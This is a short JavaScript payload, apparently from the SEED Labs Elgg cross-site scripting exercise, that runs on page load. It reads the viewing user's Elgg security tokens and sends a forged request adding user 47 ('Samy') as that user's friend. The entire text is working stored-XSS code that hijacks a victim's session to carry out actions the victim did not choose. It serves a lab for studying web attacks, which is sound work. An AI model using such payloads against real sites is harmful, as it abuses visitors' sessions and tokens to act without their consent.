window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the HTTP request to add Samy as a friend.
//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1735760964&__elgg_token=DUjeoRZfi6oEQeYM96fLHA&__elgg_ts=1735760964&__elgg_token=DUjeoRZfi6oEQeYM96fLHA
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token + ts + token;

//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
}
